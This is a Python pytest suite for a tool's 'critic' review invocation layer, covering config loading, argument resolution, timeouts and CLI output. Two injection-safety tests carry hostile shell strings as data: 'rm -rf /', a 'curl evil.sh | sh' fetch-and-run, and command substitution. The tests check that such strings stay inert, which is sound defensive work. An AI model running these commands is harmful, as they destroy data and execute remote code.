"""Unit tests for the critic-review invocation seam (issue-108)."""

from __future__ import annotations

import json
import sys
import textwrap
from pathlib import Path

import pytest

from the_loop import critics
from the_loop.critics import (
    Critic,
    CriticConfigError,
    find_critic,
    load_critics,
    resolve_invocation,
    run_critic,
)
from the_loop.harness import ClaudeCodeAdapter, CursorAgentAdapter

# --------------------------------------------------------------------- helpers


def write_config(root: Path, critics_block: str) -> Path:
    """A minimal harness config carrying just the reviews.critics list."""
    cfg_dir = root / ".the-loop"
    cfg_dir.mkdir(parents=True, exist_ok=True)
    path = cfg_dir / "harness-config.yaml"
    path.write_text(
        "reviews:\n  selfReviewCount: 3\n  criticReviewCount: 3\n"
        "  critics:\n"
        + textwrap.indent(textwrap.dedent(critics_block).strip(), "    ")
        + "\n"
    )
    return path


def stub_critic(root: Path, body: str) -> Path:
    """A tiny Python program standing in for a critic CLI."""
    path = root / "stub_critic.py"
    path.write_text(textwrap.dedent(body))
    return path


ECHO_ARGV = """
    import json, sys
    print(json.dumps({"argv": sys.argv[1:]}))
"""


# ------------------------------------------------------- adapters (T1, R1.1)


def test_oneshot_argv_appends_the_model_flag():
    argv = ClaudeCodeAdapter().oneshot_argv("review this", model="opus-4.8")
    assert argv == [
        "-p",
        "review this",
        "--output-format",
        "json",
        "--model",
        "opus-4.8",
    ]


def test_oneshot_argv_without_a_model_is_the_plain_one_shot_run():
    assert CursorAgentAdapter().oneshot_argv("review this") == [
        "-p",
        "review this",
        "--output-format",
        "json",
    ]


# ------------------------------------------------------------- loading (R1, R4)


def test_no_config_means_no_critics(tmp_path: Path):
    assert load_critics(tmp_path) == []


def test_critics_load_with_their_defaults(tmp_path: Path):
    write_config(tmp_path, "- name: cursor-gpt\n  harness: cursor\n  model: gpt-5.5\n")
    (critic,) = load_critics(tmp_path)
    assert (critic.name, critic.harness, critic.model) == (
        "cursor-gpt",
        "cursor",
        "gpt-5.5",
    )
    assert critic.enabled is True
    assert critic.output_format == "text"
    assert critic.timeout_seconds == critics.DEFAULT_TIMEOUT_SECONDS
    assert critic.error == ""
    assert critic.attribution == "[cursor/gpt-5.5]"
    assert critic.binary == "cursor-agent"


def test_pre_rename_config_is_still_read(tmp_path: Path):
    """A repo that has not run /the-loop:upgrade-the-loop keeps working (issue-82)."""
    cfg_dir = tmp_path / ".the-loop"
    cfg_dir.mkdir()
    (cfg_dir / "config.yaml").write_text(
        "reviews:\n  critics:\n    - name: c\n      harness: claude\n"
    )
    assert [c.name for c in load_critics(tmp_path)] == ["c"]


def test_duplicate_names_are_rejected(tmp_path: Path):
    write_config(
        tmp_path,
        "- name: dup\n  harness: claude\n- name: dup\n  harness: cursor\n",
    )
    with pytest.raises(CriticConfigError, match="both named 'dup'"):
        load_critics(tmp_path)


def test_find_critic_names_the_alternatives(tmp_path: Path):
    write_config(tmp_path, "- name: cursor-gpt\n  harness: cursor\n")
    with pytest.raises(CriticConfigError, match="configured: cursor-gpt"):
        find_critic(tmp_path, "nope")


@pytest.mark.parametrize(
    "block, reason",
    [
        ("- harness: claude\n", "no 'name'"),
        ("- name: c\n  harness: aider\n", "no built-in invocation"),
        ("- name: c\n  command: aider\n  args: ['--review']\n", "{prompt}"),
        (
            "- name: c\n  command: aider\n  args: ['{diff}']\n",
            "unknown placeholder {diff}",
        ),
        ("- name: c\n  harness: claude\n  env: NOT_A_MAP\n", "'env' must be a mapping"),
        (
            "- name: c\n  harness: claude\n  outputFormat: yaml\n",
            "unknown outputFormat",
        ),
        ("- name: c\n  harness: claude\n  timeoutSeconds: 0\n", "positive number"),
    ],
)
def test_invalid_entries_carry_their_reason_instead_of_failing_the_listing(
    tmp_path: Path, block: str, reason: str
):
    """R4.3: `critic list` still shows a broken entry — with why it is broken."""
    write_config(tmp_path, block)
    (critic,) = load_critics(tmp_path)
    assert reason in critic.error


def test_a_broken_entry_refuses_to_run(tmp_path: Path):
    write_config(tmp_path, "- name: c\n  harness: aider\n")
    (critic,) = load_critics(tmp_path)
    with pytest.raises(CriticConfigError, match="no built-in invocation"):
        resolve_invocation(critic, {"prompt": "review"})


def test_disabled_critic_refuses_to_run(tmp_path: Path):
    write_config(tmp_path, "- name: c\n  harness: claude\n  enabled: false\n")
    (critic,) = load_critics(tmp_path)
    with pytest.raises(CriticConfigError, match="disabled in config"):
        resolve_invocation(critic, {"prompt": "review"})


# ------------------------------------------------------------ resolution (R2)


def test_builtin_harness_derives_argv_from_the_adapter():
    critic = Critic(name="c", harness="cursor", model="gpt-5.5")
    assert resolve_invocation(critic, {"prompt": "review the diff"}) == [
        "cursor-agent",
        "-p",
        "review the diff",
        "--output-format",
        "json",
        "-m",
        "gpt-5.5",
    ]


def test_extra_args_extend_a_builtin_rather_than_replacing_it():
    critic = Critic(name="c", harness="claude", args=("--permission-mode", "plan"))
    argv = resolve_invocation(critic, {"prompt": "p"})
    assert argv[:2] == ["claude", "-p"]
    assert argv[-2:] == ["--permission-mode", "plan"]


def test_explicit_command_overrides_the_builtin():
    critic = Critic(
        name="c", harness="claude", command="my-reviewer", args=("--in", "{promptFile}")
    )
    assert resolve_invocation(critic, {"promptFile": "/tmp/p.md"}) == [
        "my-reviewer",
        "--in",
        "/tmp/p.md",
    ]


def test_placeholders_are_substituted_element_wise():
    critic = Critic(
        name="c",
        command="rev",
        args=("--prompt={prompt}", "--model", "{model}", "--item={workItem}"),
    )
    argv = resolve_invocation(
        critic,
        {"prompt": "look at this", "model": "gpt-5.5", "workItem": "issue-108"},
    )
    assert argv == [
        "rev",
        "--prompt=look at this",
        "--model",
        "gpt-5.5",
        "--item=issue-108",
    ]


def test_an_unset_placeholder_becomes_empty_not_literal_braces():
    critic = Critic(name="c", command="rev", args=("{prompt}", "{specDir}"))
    assert resolve_invocation(critic, {"prompt": "p"}) == ["rev", "p", ""]


def test_unknown_placeholder_is_rejected_at_resolution_too():
    critic = Critic(name="c", command="rev", args=("{prompt}", "{oops}"))
    with pytest.raises(CriticConfigError, match=r"unknown placeholder \{oops\}"):
        resolve_invocation(critic, {"prompt": "p"})


def test_placeholder_value_with_metacharacters_stays_one_argument():
    """Abuse case 1 — untrusted review material cannot escape into a shell."""
    hostile = "review this; rm -rf / && curl evil.sh | sh `whoami` $(id)"
    critic = Critic(name="c", command="rev", args=("--prompt", "{prompt}"))
    argv = resolve_invocation(critic, {"prompt": hostile})
    assert argv == ["rev", "--prompt", hostile]  # one element, verbatim


# ------------------------------------------------------------------- run (R3)


def test_run_returns_the_envelope_for_a_successful_round(tmp_path: Path):
    stub = stub_critic(tmp_path, 'print("no findings")')
    critic = Critic(
        name="stub",
        harness="stub-cli",
        model="m",
        command=sys.executable,
        args=(str(stub), "{prompt}"),
    )
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert result.ok is True
    assert result.exit_code == 0
    assert result.output.strip() == "no findings"
    assert result.error == ""
    assert result.attribution == "[stub-cli/m]"
    assert result.duration_seconds >= 0
    assert result.as_dict()["usage"]["present"] is False


def test_json_output_format_extracts_the_reviewers_text(tmp_path: Path):
    stub = stub_critic(
        tmp_path,
        """
        import json
        print(json.dumps({"result": "1 finding: the retry is unbounded",
                          "usage": {"input_tokens": 10, "output_tokens": 4},
                          "total_cost_usd": 0.25}))
        """,
    )
    critic = Critic(
        name="stub",
        command=sys.executable,
        args=(str(stub), "{prompt}"),
        output_format="json",
    )
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert result.output == "1 finding: the retry is unbounded"
    assert result.usage.input_tokens == 10
    assert result.usage.cost_usd == 0.25
    assert result.usage.present is True


def test_json_output_falls_back_to_raw_stdout(tmp_path: Path):
    """A critic that printed prose still produced a review — never drop it."""
    stub = stub_critic(tmp_path, 'print("plain prose, not JSON")')
    critic = Critic(
        name="stub",
        command=sys.executable,
        args=(str(stub), "{prompt}"),
        output_format="json",
    )
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert result.output.strip() == "plain prose, not JSON"


def test_non_zero_exit_is_a_failed_round(tmp_path: Path):
    stub = stub_critic(
        tmp_path,
        """
        import sys
        print("partial output")
        sys.stderr.write("rate limited")
        sys.exit(3)
        """,
    )
    critic = Critic(name="stub", command=sys.executable, args=(str(stub), "{prompt}"))
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert result.ok is False
    assert result.exit_code == 3
    assert "rate limited" in result.error


def test_missing_binary_fails_closed(tmp_path: Path):
    """Abuse case 3 — no fallback executable, ever."""
    critic = Critic(
        name="stub", command="definitely-not-installed-xyz", args=("{prompt}",)
    )
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert result.ok is False
    assert "not found on PATH" in result.error


def test_timeout_is_reported_as_a_failed_round(tmp_path: Path):
    """Abuse case 4 — a hung critic cannot wedge the review loop."""
    stub = stub_critic(tmp_path, "import time; time.sleep(30)")
    critic = Critic(
        name="stub",
        command=sys.executable,
        args=(str(stub), "{prompt}"),
        timeout_seconds=0.5,
    )
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert result.ok is False
    assert "timed out after 0.5s" in result.error


def test_env_overlays_the_inherited_environment(tmp_path: Path, monkeypatch):
    """The critic keeps the operator's ambient credentials; `env` only adds to them."""
    monkeypatch.setenv("AMBIENT_TOKEN", "from-the-operator")
    stub = stub_critic(
        tmp_path,
        """
        import json, os
        print(json.dumps({"ambient": os.environ.get("AMBIENT_TOKEN", ""),
                          "overlaid": os.environ.get("CRITIC_KNOB", "")}))
        """,
    )
    critic = Critic(
        name="stub",
        command=sys.executable,
        args=(str(stub), "{prompt}"),
        env={"CRITIC_KNOB": "on"},
    )
    result = run_critic(critic, {"prompt": "review"}, cwd=str(tmp_path))
    assert json.loads(result.output) == {
        "ambient": "from-the-operator",
        "overlaid": "on",
    }


def test_the_round_runs_in_the_requested_directory(tmp_path: Path):
    workdir = tmp_path / "checkout"
    workdir.mkdir()
    stub = stub_critic(tmp_path, "import os; print(os.getcwd())")
    critic = Critic(name="stub", command=sys.executable, args=(str(stub), "{prompt}"))
    result = run_critic(critic, {"prompt": "review"}, cwd=str(workdir))
    assert Path(result.output.strip()).resolve() == workdir.resolve()


def test_the_prompt_reaches_the_critic_as_one_argument(tmp_path: Path):
    stub = stub_critic(tmp_path, ECHO_ARGV)
    critic = Critic(
        name="stub",
        command=sys.executable,
        args=(str(stub), "--prompt", "{prompt}"),
        output_format="json",
    )
    hostile = "findings; rm -rf /"
    result = run_critic(critic, {"prompt": hostile}, cwd=str(tmp_path))
    assert json.loads(result.output)["argv"] == ["--prompt", hostile]


# --------------------------------------------------------------- CLI (R3, R4)


def run_cli(argv: list[str]) -> int:
    from the_loop.cli import main

    return main(argv)


def test_critic_command_is_registered():
    from the_loop.commands import iter_commands

    assert "critic" in {c.name for c in iter_commands()}


def test_list_reports_availability(tmp_path: Path, capsys):
    write_config(
        tmp_path,
        """
        - name: cursor-gpt
          harness: cursor
          model: gpt-5.5
        - name: paused
          harness: claude
          enabled: false
        - name: broken
          harness: aider
        """,
    )
    assert run_cli(["critic", "list", "--root", str(tmp_path), "--format", "json"]) == 0
    rows = json.loads(capsys.readouterr().out)
    by_name = {row["critic"]: row for row in rows}
    assert by_name["cursor-gpt"]["binary"] == "cursor-agent"
    assert by_name["cursor-gpt"]["available"] is False  # not installed in CI
    assert by_name["paused"]["enabled"] is False
    assert "no built-in invocation" in by_name["broken"]["error"]


def test_list_with_no_critics_exits_zero(tmp_path: Path, capsys):
    write_config(tmp_path, "[]")
    assert run_cli(["critic", "list", "--root", str(tmp_path)]) == 0
    assert "no critics configured" in capsys.readouterr().out.lower()


def test_run_prints_a_single_json_object_on_stdout(tmp_path: Path, capsys):
    stub = stub_critic(tmp_path, 'print("no findings")')
    write_config(
        tmp_path,
        f"""
        - name: stub
          harness: stub-cli
          model: m
          command: {sys.executable}
          args: ["{stub}", "{{prompt}}"]
        """,
    )
    code = run_cli(
        ["critic", "run", "stub", "--root", str(tmp_path), "--prompt", "review this"]
    )
    assert code == 0
    envelope = json.loads(capsys.readouterr().out)  # the ONLY thing on stdout
    assert envelope["critic"] == "stub"
    assert envelope["attribution"] == "[stub-cli/m]"
    assert envelope["ok"] is True
    assert envelope["exitCode"] == 0
    assert envelope["output"].strip() == "no findings"
    assert set(envelope) == {
        "critic",
        "harness",
        "model",
        "attribution",
        "ok",
        "exitCode",
        "durationSeconds",
        "output",
        "error",
        "usage",
    }


def test_run_accepts_a_prompt_file_and_exposes_its_path(tmp_path: Path, capsys):
    stub = stub_critic(tmp_path, ECHO_ARGV)
    prompt_file = tmp_path / "round-1.md"
    prompt_file.write_text("Review the diff for issue-108.")
    write_config(
        tmp_path,
        f"""
        - name: stub
          command: {sys.executable}
          args: ["{stub}", "--in", "{{promptFile}}"]
          outputFormat: json
        """,
    )
    assert (
        run_cli(
            [
                "critic",
                "run",
                "stub",
                "--root",
                str(tmp_path),
                "--prompt-file",
                str(prompt_file),
            ]
        )
        == 0
    )
    envelope = json.loads(capsys.readouterr().out)
    assert json.loads(envelope["output"])["argv"] == ["--in", str(prompt_file)]


def test_prompt_file_placeholder_works_even_with_an_inline_prompt(
    tmp_path: Path, capsys
):
    """A critic CLI that only reads files still works with --prompt."""
    stub = stub_critic(
        tmp_path,
        """
        import sys
        print(open(sys.argv[1]).read())
        """,
    )
    write_config(
        tmp_path,
        f"""
        - name: stub
          command: {sys.executable}
          args: ["{stub}", "{{promptFile}}"]
        """,
    )
    assert (
        run_cli(
            [
                "critic",
                "run",
                "stub",
                "--root",
                str(tmp_path),
                "--prompt",
                "inline text",
            ]
        )
        == 0
    )
    assert json.loads(capsys.readouterr().out)["output"].strip() == "inline text"


def test_run_requires_exactly_one_prompt_source(tmp_path: Path):
    write_config(tmp_path, "- name: stub\n  harness: claude\n")
    with pytest.raises(SystemExit):
        run_cli(["critic", "run", "stub", "--root", str(tmp_path)])


def test_run_requires_an_explicit_critic_name(tmp_path: Path):
    """Abuse case 2 — there is no run-all mode, so a new entry never self-executes."""
    write_config(tmp_path, "- name: stub\n  harness: claude\n")
    with pytest.raises(SystemExit):
        run_cli(["critic", "run", "--root", str(tmp_path), "--prompt", "p"])


def test_a_failed_round_still_prints_its_envelope_and_exits_non_zero(
    tmp_path: Path, capsys
):
    write_config(
        tmp_path,
        """
        - name: stub
          command: definitely-not-installed-xyz
          args: ["{prompt}"]
        """,
    )
    code = run_cli(["critic", "run", "stub", "--root", str(tmp_path), "--prompt", "p"])
    assert code == 1
    envelope = json.loads(capsys.readouterr().out)
    assert envelope["ok"] is False
    assert "not found on PATH" in envelope["error"]


def test_a_misconfigured_critic_exits_two_without_spawning(tmp_path: Path, capsys):
    write_config(tmp_path, "- name: stub\n  harness: aider\n")
    code = run_cli(["critic", "run", "stub", "--root", str(tmp_path), "--prompt", "p"])
    assert code == 2
    assert capsys.readouterr().out.strip() == ""  # nothing ran, nothing to report


def test_output_file_records_the_envelope(tmp_path: Path, capsys):
    stub = stub_critic(tmp_path, 'print("ok")')
    out = tmp_path / "round-1.json"
    write_config(
        tmp_path,
        f"""
        - name: stub
          command: {sys.executable}
          args: ["{stub}", "{{prompt}}"]
        """,
    )
    assert (
        run_cli(
            [
                "critic",
                "run",
                "stub",
                "--root",
                str(tmp_path),
                "--prompt",
                "p",
                "--output-file",
                str(out),
            ]
        )
        == 0
    )
    capsys.readouterr()
    assert json.loads(out.read_text())["ok"] is True
